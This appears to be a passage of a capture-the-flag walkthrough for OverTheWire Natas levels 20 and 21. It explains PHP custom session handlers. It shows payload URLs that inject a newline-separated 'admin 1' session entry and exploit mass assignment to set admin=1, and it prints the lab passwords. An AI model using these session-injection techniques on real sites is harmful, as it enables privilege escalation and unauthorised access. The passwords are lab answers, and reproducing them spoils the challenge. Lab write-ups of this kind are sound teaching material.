session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```

Starting with the function `session_start()`, it initializes a session or loads existing session through `session_id` (stored in browser cookies).

Let's make a short research to know clearly how this function works.

![image](/assets/images/lv20-2.png)

As I see, when this function is called, PHP need to know if any session is working. It finds `PHPSESSID` in parameters in GET/ POST request or Cookies. If `PHPSESSID` is existing, PHP resumes the old session. Otherwise, it initializes a new session.

This function works based on `session handlers`, which is manually initialized in this program through `session_set_save_handler()` method. In particularly, I need to pay attention on `read` handler and `write` handler.

How does the `read` handler work? It receives Session ID, which is stored as `serialized`, for example:

```plaintext
a:2:{s:8:"username";s:5:"Alice";s:5:"role";s:5:"admin";}
```

PHP calls `unserialize()` to convert the data above into `$_SESSION` array, for example:

```plaintext
$_SESSION = [
    "username" => "Alice",
    "role" => "admin"
];
```

The `write` handler is used to store session's data to file or database.

Let's explore how these 2 functions work in this PHP prorgam.

```php
function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}
```

As I have explained before, the function `myread` receives `sid` as a parameter, which is currently in unserialized (array) form and stored in `data`.

Look at this script in `myread`:

```php
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
```

This foreach loop divides `data` into seperated lines. In each line, data is formatted as `{key, value}` format.

`if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];`: this script checks if the key is valid (not empty) and stores session data in `$_SESSION` array as `{key, value}` format:

`$_SESSION[$parts[0]] = $parts[1]`

Then `myread` returns session data as encoded.

In `mywrite` function, it receives session data and also stores data as `{key, value}` format.

In `print_credentials()` function, it requires that the session data should have a field called `admin` (key) and it's value is `1`, then the password will be revealed.

To send the session data to server, I can do it through URL's parameters.

This is the correctly URL:

```plaintext
http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201
```

![image](/assets/images/lv20-3.png)

Password: **BPhv63cKE1lkQl04cE5CuFTzXe15NfiH**

## Level 21

There are 2 web pages in this level.

![image](/assets/images/lv21-2.png)

![image](/assets/images/lv21-1.png)

Source code for page 1:

```php
<?php

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}

session_start();
print_credentials();

?>
```

Source code for page 1:

```php
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

Looking at the source code of the first page, it seems that there's nothing different to other levels. There's only a `print_credentials()` function to check if the value of the `admin` field is equal to 1.

Moving to the second page, I can see that there's a request check in the head of the script, then stores into session data:

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

Information that user should put into requests is CSS style of the web page. There's a list of valid keys, but there isn't any checking in this program.

→ All data is submitted will be stored in session data as `{key, value}`.

Moreover, session data between 2 web pages is seemed to be connected together. Trying following this step to catch the password.

- Login into the second page with the following URL:

```plaintext
http://natas21-experimenter.natas.labs.overthewire.org?submit&admin=1
```

- After the above step, I have had a cookie `PHPSESSID` with the `admin` field included and its value is 1.

- Back to the first web page, inject this cookie into it and receive the password.

![image](/assets/images/lv21-3.png)

Password: **d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz**
